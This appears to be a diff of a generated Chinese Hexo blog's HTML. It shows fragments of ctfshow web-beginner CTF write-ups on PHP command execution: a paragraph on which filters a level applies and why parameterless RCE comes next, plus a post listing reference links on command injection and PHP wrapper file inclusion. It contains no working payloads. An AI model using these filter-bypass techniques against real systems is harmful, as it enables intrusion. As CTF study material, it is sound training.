+<li>\(第一个转义是告诉php字符串有一个\开头（用于标明起始的匹配 ），第一个\的后面是要匹配的字符，同时要匹配的字符也要双写\,所以一共有四个)</li>
+</ul>
+</li>
+</ul>
+<h2 id="下一步，我该做些什么"><a href="#下一步，我该做些什么" class="headerlink" title="下一步，我该做些什么"></a>下一步，我该做些什么</h2><p>这道题把之前的日志注入和文件包含绕过的前提，$符号给过滤了，同时禁用了单双引号，分隔符上面只过滤了空格和超全局数组，php的终结符没法用了，bash的%0a换行仍然可用，引号的超全家数组替代也被过滤了（没法使用引号也自然没法执行系统命令），由于$被禁用，自己创建新的键也无望，因此，我们要引出一个知识点，无参数rce，仅仅依赖堆叠函数就可以找到自己想要的。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web37-web44/" data-id="cm1qm1c9d000b9wvh8zwff1sb" data-title="ctfshow-web入门系列-命令执行-web37-web44" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-hack/ctfshow/web入门/命令执行/命令执行，命令执行的文件包含必看文章" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%BF%85%E7%9C%8B%E6%96%87%E7%AB%A0/" class="article-date">
+  <time class="dt-published" datetime="2024-10-01T04:04:00.000Z" itemprop="datePublished">2024-10-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/hack/">hack</a>►<a class="article-category-link" href="/categories/hack/ctfshow/">ctfshow</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/">web入门</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%BF%85%E7%9C%8B%E6%96%87%E7%AB%A0/">命令执行，命令执行的文件包含必看文章</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="单纯的关键字问题"><a href="#单纯的关键字问题" class="headerlink" title="单纯的关键字问题"></a>单纯的关键字问题</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/meng-han/p/16735478.html">CTF之PHP命令执行 - hithub - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/319567.html">CTF中命令执行常用知识点总结 - FreeBuf网络安全行业门户</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45655564/article/details/117395152">命令注入————ctfhub（过滤cat、空格、目录分隔符、运算符、综合过滤练习）_ctfhub 命令注入-过滤空格-CSDN博客</a></p>
+<h1 id="伪协议，文件包含"><a href="#伪协议，文件包含" class="headerlink" title="伪协议，文件包含"></a>伪协议，文件包含</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/endust/p/11804767.html">php伪协议 - 看不尽的尘埃 - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/2401_84215240/article/details/138187551">Web漏洞-文件包含漏洞超详细全解（附实例）_【web漏洞百例】_文件包含漏洞的案例-CSDN博客</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%BF%85%E7%9C%8B%E6%96%87%E7%AB%A0/" data-id="cm1qm1c9d000c9wvh4pkg49gl" data-title="命令执行，命令执行的文件包含必看文章" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -566,53 +616,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E6%9B%BF%E6%8D%A2%E6%94%B6%E5%BD%95/" data-id="cm1px097a000mc8vh53u46xrg" data-title="常见过滤替换收录" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hack/ctfshow/web入门/命令执行/命令执行，命令执行的文件包含必看文章" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%BF%85%E7%9C%8B%E6%96%87%E7%AB%A0/" class="article-date">
-  <time class="dt-published" datetime="2024-10-01T04:04:00.000Z" itemprop="datePublished">2024-10-01</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/hack/">hack</a>►<a class="article-category-link" href="/categories/hack/ctfshow/">ctfshow</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/">web入门</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%BF%85%E7%9C%8B%E6%96%87%E7%AB%A0/">命令执行，命令执行的文件包含必看文章</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="单纯的关键字问题"><a href="#单纯的关键字问题" class="headerlink" title="单纯的关键字问题"></a>单纯的关键字问题</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/meng-han/p/16735478.html">CTF之PHP命令执行 - hithub - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/319567.html">CTF中命令执行常用知识点总结 - FreeBuf网络安全行业门户</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45655564/article/details/117395152">命令注入————ctfhub（过滤cat、空格、目录分隔符、运算符、综合过滤练习）_ctfhub 命令注入-过滤空格-CSDN博客</a></p>
-<h1 id="伪协议，文件包含"><a href="#伪协议，文件包含" class="headerlink" title="伪协议，文件包含"></a>伪协议，文件包含</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/endust/p/11804767.html">php伪协议 - 看不尽的尘埃 - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/2401_84215240/article/details/138187551">Web漏洞-文件包含漏洞超详细全解（附实例）_【web漏洞百例】_文件包含漏洞的案例-CSDN博客</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%BF%85%E7%9C%8B%E6%96%87%E7%AB%A0/" data-id="cm1px097b000nc8vh948ieaq7" data-title="命令执行，命令执行的文件包含必看文章" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E6%9B%BF%E6%8D%A2%E6%94%B6%E5%BD%95/" data-id="cm1qm1c9e000e9wvhah246vps" data-title="常见过滤替换收录" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -634,7 +638,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
+    <h3 class="widget-title">分类</h3>
     <div class="widget">
       <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/hack/">hack</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/hack/ctfshow/">ctfshow</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/">web入门</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></li></ul></li></ul></li></ul></li></ul>
     </div>
@@ -644,7 +648,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
+    <h3 class="widget-title">标签</h3>
     <div class="widget">
       <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
     </div>
@@ -654,7 +658,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
+    <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
       <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a>
     </div>
@@ -663,9 +667,9 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
+    <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">十月 2024</a></li></ul>
     </div>
   </div>
 
@@ -673,24 +677,24 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
+    <h3 class="widget-title">最新文章</h3>
     <div class="widget">
       <ul>
-        
-          <li>
-            <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web37-web44/">ctfshow-web入门系列-命令执行-web37-web44</a>
-          </li>
         
           <li>
             <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/">ctfshow-web入门系列-命令执行-web29-web36</a>
           </li>
         
           <li>
-            <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E6%9B%BF%E6%8D%A2%E6%94%B6%E5%BD%95/">常见过滤替换收录</a>
+            <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web37-web44/">ctfshow-web入门系列-命令执行-web37-web44</a>
           </li>
         
           <li>
             <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%BF%85%E7%9C%8B%E6%96%87%E7%AB%A0/">命令执行，命令执行的文件包含必看文章</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E6%9B%BF%E6%8D%A2%E6%94%B6%E5%BD%95/">常见过滤替换收录</a>
           </li>
         
       </ul>
@@ -706,7 +710,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       
-      &copy; 2024 John Doe<br>
+      &copy; 2024 Wang Han<br>
       Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
